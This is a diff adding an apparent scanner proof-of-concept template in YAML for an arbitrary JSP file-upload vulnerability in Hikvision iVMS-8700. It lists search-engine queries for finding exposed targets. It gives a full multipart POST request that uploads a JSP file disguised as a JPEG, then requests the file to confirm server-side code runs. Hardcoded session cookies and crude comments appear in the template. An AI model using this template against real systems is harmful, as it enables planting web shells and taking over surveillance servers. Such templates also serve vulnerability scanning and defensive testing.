@@ -1,0 +1,67 @@
+name: haikang-iVMS-8700-upload.action-upload
+detail:
+  author: 
+  links:
+    - 
+  vulnerability:
+    level: critical
+    fofa-query: icon_hash="-911494769"
+    hunter-query: web.icon=="3670cbb1369332b296ce44a94b7dd685"
+    quake-query: favicon:"3670cbb1369332b296ce44a94b7dd685"
+    zoomeye-query: 
+    threatbook-query: 
+    cve: 
+    tips: d:/Program Files (x86)/SurveillanceSystem/CMS/webserver/Tomcat/webapps/eps/upload/xx.jsp 目录
+
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    s3: randomLowercase(8)
+    rboundary: randomInt(800000000, 1000000000)
+    reverse: newReverse()  # 结果表达式写 reverse.wait(5)
+    reverseURL: reverse.url # http://xxx
+    reverseRMI: reverse.rmi # rmi://xx 
+    requestURL: request.url # 目标url http://xx
+    t1: timeConvert(now(), '2006-01-02')
+    t2: timeConvert(now(), '2006-01')
+    b1: base64Decode("")
+    h1: hexDecode("")
+    # m5: md5(string(requestURL))) m5 不调用的话，就会报错运行不起来
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /eps/resourceOperations/upload.action
+      follow_redirects: false
+      headers:
+        Cache-Control: max-age=0
+        User-Agent: MicroMessenger
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: ISMS_8700_Sessionname=CA0F207A6372FE883ACA78B74E6DC953; CAS-USERNAME=058; ISMS_8700_Sessionname=4D808BE7BE0E5C7047B9688E6009F710
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTJyhtTNqdMNLZLhj
+      body: "------WebKitFormBoundaryTJyhtTNqdMNLZLhj\r\nContent-Disposition: form-data; name=\"fileUploader\";filename=\"bottlle.jsp\"\r\nContent-Type: image/jpeg\r\n\r\n<%out.print(\"4ndex\");%>\r\n------WebKitFormBoundaryTJyhtTNqdMNLZLhj--"
+      
+    expression: response.status == 200 && (response.body_string.contains("上传附件成功") || response.body.bcontains(bytes("上传附件成功")))
+
+    output:
+      search: '"(?P<rfile>\\w+.jsp)".bsubmatch(response.body)'
+      rfile: search["rfile"]          //  cnm.jsp
+      search1: '"resourceUuid\":\"(?P<rdir>.+?)\",\"resourceType".bsubmatch(response.body)' # '"date\":\"(?P<date>.+?)\",\"macaddr".bsubmatch(response.body)'
+      rdir: search1["rdir"]           //  fuck
+      HA: rfile + "-r2d2-" + rdir     //  cnm.jsp-r2d2-fuck
+      password: substr(md5(HA),0,7)   //  e3048ad
+
+  r1:
+    request:
+      method: GET
+      path: /eps/upload/{{rdir}}.jsp
+      follow_redirects: false
+      headers:
+      body: 
+
+    expression: response.status == 200 && (response.body_string.contains("4ndex") || response.body.bcontains(bytes("4ndex")))
+    
+expression: r0() && r1()
